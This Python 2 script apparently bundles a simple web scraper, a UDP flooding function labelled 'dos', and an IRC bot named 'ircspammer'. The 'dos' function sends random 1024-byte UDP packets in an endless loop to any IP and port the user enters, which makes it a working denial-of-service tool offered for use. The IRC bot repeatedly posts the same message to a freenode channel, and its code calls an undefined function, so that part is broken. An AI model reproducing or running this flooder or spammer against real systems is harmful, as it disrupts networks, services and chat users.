# -*- coding: utf-8 -*-
import os
from bs4 import BeautifulSoup
import urllib
import random
import socket
import string





def scraper():

 os.system('clear')
 print """
  ___  ___ _ __ __ _ _ __   ___ _ __ 
 / __|/ __| '__/ _` | '_ \ / _ \ '__|
 \__ \ (__| | | (_| | |_) |  __/ |   
 |___/\___|_|  \__,_| .__/ \___|_|   
                    | |              
                    |_|              
 """
 print "this is a simple webscraper written in python, press enter to exit"
 site = raw_input("site :")
 r = urllib.urlopen(site)
 soup = BeautifulSoup(r)
 print soup.prettify()[0:1000]

def dos():
 os.system('clear')
 print """
 

     _                     
    | |                    
  __| | ___  ___  ___ _ __ 
 / _` |/ _ \/ __|/ _ \ '__|
| (_| | (_) \__ \  __/ |   
 \__,_|\___/|___/\___|_|   
                           
                           

"""

 sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 bytes=random._urandom(1024)
 ip=raw_input('Target IP: ')
 port=input('Port: ')
 print "press ctrl+z to stop"
 while True:
    sock.sendto(bytes,(ip,port))

def ircspammer():



 # mport some necessary libraries.
 import socket 

 # Some basic variables used to configure the bot        
 server = "irc.freenode.net" # Server
 channel = "#HitTest" # Channel
 botnick = "TetaBot" # Your bots nick


 def ping(): # This is our first function! It will respond to server Pings.
  ircsock.send("PONG :pingis\n")  

 def sendmsg(chan , msg): # This is the send message function, it simply sends messages to the channel.
  ircsock.send("PRIVMSG "+ chan +" :"+ msg +"\n") 

 def joinchan(chan): # This function is used to join channels.
  ircsock.send("JOIN "+ chan +"\n")

 def hello(): # This function responds to a user that inputs "Hello Mybot"
  ircsock.send("PRIVMSG "+ channel +" :Hello!\n")
                  
 ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 ircsock.connect((server, 6667)) # Here we connect to the server using the port 6667
 ircsock.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :Hi.\n") # user authentication
 ircsock.send("NICK "+ botnick +"\n") # here we actually assign the nick to the bot

 joinchan(channel) # Join the channel using the functions we previously defined
 
 while 1: # Be careful with these! it might send you to an infinite loop
   ircmsg = ircsock.recv(2048) # receive data from the server
   ircmsg = ircmsg.strip('\n\r') # removing any unnecessary linebreaks.
   print(ircmsg) # Here we print what's coming from the server
   if ircmsg.find(' PRIVMSG ')!=-1:
      nick=ircmsg.split('!')[0][1:]
      channel=ircmsg.split(' PRIVMSG ')[-1].split(' :')[0]
      commands(nick,channel,ircmsg)
   if ircmsg.find(":Hello "+ botnick) != -1: # If we can find "Hello Mybot" it will call the function hello()
     hello()

   if ircmsg.find("PING :") != -1: # if the server pings us then we've got to respond!
     ping()

   ircsock.send("PRIVMSG "+ channel +" :Hi m8\n")
